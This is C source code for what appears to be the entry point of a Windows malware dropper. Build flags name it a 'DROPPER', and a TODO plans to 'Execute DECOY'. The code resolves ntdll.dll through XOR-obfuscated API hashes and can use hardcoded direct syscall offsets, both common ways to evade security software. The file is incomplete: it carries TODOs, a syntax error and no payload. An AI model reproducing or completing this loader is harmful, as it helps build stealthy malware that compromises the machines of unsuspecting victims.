#include <config.h>
#include <ldr.h>
#include <ntapi.h>
#include <instance.h>
#include <crypto\crc32.h>
#include "ntapi\ntapi.h"

enum {
    HASH_NTDLL_KEY    = RTLP_LCG_DWORD,
    HASH_NTDLLALT_KEY = RTLP_LCG_DWORD,
};

static CONST VOLATILE DWORD NtdllStrxsum    = 0xA62A3B3B ^ HASH_NTDLL_KEY;    // ntdll.dll
static CONST VOLATILE DWORD NtdllStrxsumAlt = 0x145370BB ^ HASH_NTDLLALT_KEY; // NTDLL.DLL

static
BOOL
DECLSPEC_DEPRECATED_S("Temporary")
LoadBasicFunctions(VOID)
{
    $DLOG0(DLG_FLT_INFO, "Loading ntapi");

    HMODULE hModule;

    if (IS_NULL(hModule = LdrGetModule(NtdllStrxsum ^ HASH_NTDLL_KEY))) {
        /* For future versions, you never know */
        if (IS_NULL(hModule = LdrGetModule(NtdllStrxsumAlt ^ HASH_NTDLLALT_KEY))) {
            $DLOG0(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");

            return FALSE;
        }
    }

    $DLOG2(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);

#if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
    if (FALSE) {
#elif SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    if (TRUE) {
#else
    if (Config.NtVersion.bIsDeprecated) {
#endif
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            NtapiSyscallsNamesHash[i] ^= NtapiSyscallsNamesHashXorKey;
        }

        ULONG dwFunctionsImported = LdrGetProcAddressEx(
            hModule,
            NtapiSyscallsFunctionsCount,
            NtapiSyscallsNamesHash,
            NtapiSyscallsAddressStorage
            );

        if (dwFunctionsImported != NtapiSyscallsFunctionsCount) {
            $DLOG0(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);
        }
    } else {
        PULONG_PTR dwSyscallOffset = (PULONG_PTR)(Config.Cpu.bUnderWow64 ? &NtapiSyscallsOffsetWow64 : &NtapiSyscallsOffsetX86) + (Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount);

        PRAGMA_LOOP_UNROLL_N(16)
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            NtapiSyscallsAddressStorage[i] = (PVOID)dwSyscallOffset[i];
        }
    }

    $DLOG1(DLG_FLT_INFO, "Done");

    return TRUE;
}

VOID
TEest(VOID);

ULONG
WINAPI
InitialEntry(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD0_DOS);

        $DLogInitialize(&DebugName, 0x1000);
    #endif

    if (!InitConfig()) {
        return 0;
    }

    if(!LoadBasicFunctions()) {
        return 0;
    }

    PVOID pBase = NULL;
    SIZE_T cbBase = PAGE_SIZE;

    $DLOG0(DLG_FLT_HIGHLIGHT, "%08lX", NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(), &pBase, 0, &cbBase, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)));

    //TODO:
    //    LZO

     InitCrc32();

 #if SCFG_IGNORE_ISTANCE == ON
     CreateInstance()

     if (TRUE) {
 #else
     if (CreateInstance()) {
 #endif
        
     }


    // TODO: Execute DECOY

    return 0;
}
 